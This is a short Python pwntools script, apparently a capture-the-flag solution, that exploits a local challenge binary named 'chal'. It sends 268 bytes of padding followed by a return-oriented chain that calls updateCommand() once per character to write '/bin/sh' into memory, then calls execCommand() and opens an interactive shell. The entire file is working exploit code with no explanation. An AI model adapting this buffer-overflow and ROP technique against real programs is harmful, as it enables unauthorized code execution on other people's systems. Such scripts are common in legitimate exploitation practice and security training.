#!/usr/bin/python3
from pwn import process, p32, u8

shell = process("./chal")

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

payload  = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x80491f3)      # updateCommand()
    payload += p32(0x804901b)      # add esp, 8; pop ebx; ret;
    payload += p32(i)              # index
    payload += p32(u8(cmd[i:i+1])) # character
    payload += p32(0x41414141)

payload += p32(0x804921d) # execCommand()

shell.sendlineafter(b"...\n", payload)
shell.interactive()
